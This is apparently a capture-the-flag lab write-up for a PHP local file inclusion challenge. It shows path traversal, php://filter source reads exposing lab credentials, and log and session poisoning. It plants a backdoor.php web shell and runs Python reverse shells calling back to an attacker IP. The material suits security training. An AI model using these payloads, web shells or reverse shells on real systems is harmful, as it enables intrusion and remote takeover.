# LFI


## Flag 1 - view /etc/flag
nmap
```
nmap -sC -sV 10.10.204.37 -oN nmap/init
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-18 04:14 EST
Nmap scan report for 10.10.204.37
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:07:d3:36:85:e3:3d:17:90:45:92:23:10:bf:d3:33 (RSA)
|   256 f4:e8:ff:5c:c8:90:de:b4:bc:0b:e5:9f:a5:62:88:9f (ECDSA)
|_  256 43:0c:fb:ff:d4:6d:a5:1b:15:ed:70:05:8c:0f:f5:0d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Site doesn't have a title (text/html).
|_Requested resource was index.php?err=error.txt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.76 seconds
```

Visit page (port 80). First page lands on `https://10.10.204.37/index.php?err=/etc/flag`

Visit `http://10.10.204.37/index.php?err=doesntexist` shows helpful error regarding file inclusion

```
Warning
: include(doesntexist) [
function.include
]: failed to open stream: No such file or directory in
/var/www/html/index.php
on line
23


Warning
: include() [
function.include
]: Failed opening 'doesntexist' for inclusion (include_path='.:/usr/lib/php5.2/lib/php') in
/var/www/html/index.php
on line
23
```

Visiting a all readable file /etc/passwd displays result which means this is vulnerable to LFI `http://10.10.204.37/index.php?err=../../../etc/passwd`

Visit `https://10.10.204.37/index.php?err=/etc/flag` to get first flag `THM{d29e08941cf7fe41df55f1a7da6c4c06}`

## Flag 2 - view index.php source code

To get content of the php code itself, use php filter technique. If we pass the page itself, the client will just render the php. 

Ie. if we visit `https://10.10.204.37/index.php?err=index.php` we would get php error.

We use base64 encoding with `php://filter/convert.base64-encode/resource` 

Visit to see if this works `https://10.10.204.37/index.php?err=php://filter/convert.base64-encode/resource=/etc/passwd`

Visit `https://10.10.204.37/index.php?err=php://filter/convert.base64-encode/resource=index.php` and decode base64 to get source code

```
echo "PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8" | base64 -d
<?php session_start();
$flag = "THM{791d43d46018a0d89361dbf60d5d9eb8}";
include("./includes/creds.php");
if($_SESSION['username'] === $USER){                        
        header( 'Location: manage.php' );
        die();
} else {
        $labNum = "";
  require "./includes/header.php";
?base64: invalid input
```

flag: `THM{791d43d46018a0d89361dbf60d5d9eb8}`

## Flag 3 

Visit `https://10.10.204.37/index.php?err=php://filter/convert.base64-encode/resource=includes/creds.php` and decode base64

```
echo "PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo" | base64 -d
<?php 
$USER = "McSkidy";
$PASS = "A0C315Aw3s0m";
base64: invalid input
```

## Flag 4

Log in with the creds and navigate to recover password

flag: `THM{552f313b52e3c3dbf5257d8c6db7f6f1}`

## Flag 5 - RCE

### POC RCE

Navigate to log access and see the format of the log to be `user:ip:USER-Agent:Page.` The log file location is at `./includes/logs/app_access.log`

Sending curl request `curl -A "hacker-user-agent" http://10.10.204.37` results in logs showing our user agent `Guest:172.17.0.1:hacker-user-agent:/`

We can use user agent field. Include php in the user-agent

Sending `curl -A "<?php phpinfo()?>" http://10.10.204.37` results in in user agent present `Guest:172.17.0.1::/`. This means php has been rendered. Viewing log page via browser shows php infor page `https://10.10.204.37/index.php?err=./includes/logs/app_access.log` (without being logged in)

Sending backdoor curl command `curl -A "<?php echo 'hayyy        ';system(\$_GET['cmd']);?>" http://10.10.204.37/index.php`. This creates a php code into the log file that will allow us to use the cmd param to execute code

Visit `http://10.10.204.37/index.php?err=../../../../var/www/html/includes/logs/app_access.log` shows an error in the log entry
```
Guest:172.17.0.1:hayyy
Warning
: system() [
function.system
]: Cannot execute a blank command in
/var/www/html/includes/logs/app_access.log
on line
4
```

Visit `http://10.10.204.37/index.php?err=../../../../var/www/html/includes/logs/app_access.log&cmd=whoami` with cmd `whoami` supplied shows RCE works
```
Guest:172.17.0.1:hayyy www-data :/index.php
```

### Add a second backdoor - backdoor.php

Visit `10.10.204.37/index.php?err=../../../../var/www/html/includes/logs/app_access.log&cmd=echo '<?php echo 'hayyy        ';system(\$_GET['cmd']);?>' > backdoor.php` to create a file `backdoor.php` with our php code 

Visit `http://10.10.204.37/backdoor.php` shows 
```
hayyy
Warning: system() [function.system]: Cannot execute a blank command in /var/www/html/backdoor.php on line 1
```

We can now execute code eg. `http://10.10.204.37/backdoor.php?cmd=whoami`
```
hayyywww-data 
```

### Set up a reverse shell

Enumerate commands with `which` to find what exists - finds python `http://10.10.204.37/backdoor.php?cmd=which%20python`
```
hayyy/usr/bin/python
```

Attacker machine - run nc listener
```
nc -nvlp 1337
```

Create a reverse shell with python
```
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.9.88.232",1337));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

On the attacker machine we receive a shell
```
$ whoami
www-data
$ hostname    
lfi-aoc-awesome-59aedca683fff9261263bb084880c965
$ ls
backdoor.php
css
error.txt
img
includes
index.php
js
login.php
logout.php
logs.php
manage.php
recover-password.php
reset.php
sensitive-data
```

### Bonus - log poisoning to get RCE

All session info are stored in /tmp/ and prefix with `sess_`

```
$ cd /tmp
$ ls
sess_0cfutnvsmoki60tvufsohkjko5
sess_1sk49qipta02q9k9a8j71i5ni4
sess_35pnhu3murvr4ln63d5k99qa94
...
```

Start new Firefox window and get `PHPSESSID=ns3p3gi1hj3bktt6u03d4j3t24` from request header

Inject php code into log by logging in with username: `<?php echo 'zebralmao';system($_GET['cmd']);?>`

Visit LFI page prove command execution `10.10.204.37/index.php?err=../../../../../tmp/sess_ns3p3gi1hj3bktt6u03d4j3t24&cmd=whoami`

Start nc listener on port 9876
```
nc -lvnp 9876
```

Inject python reverse shell 
```python
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.9.88.232",9876));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

by visiting `10.10.204.37/index.php?err=../../../../../tmp/sess_ns3p3gi1hj3bktt6u03d4j3t24&cmd=python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.9.88.232",9876));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'`


And we get a reverse shell
```
kali@kali:~$ nc -lvnp 9876
listening on [any] 9876 ...
connect to [10.9.88.232] from (UNKNOWN) [10.10.204.37] 46866
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
lfi-aoc-awesome-59aedca683fff9261263bb084880c965
```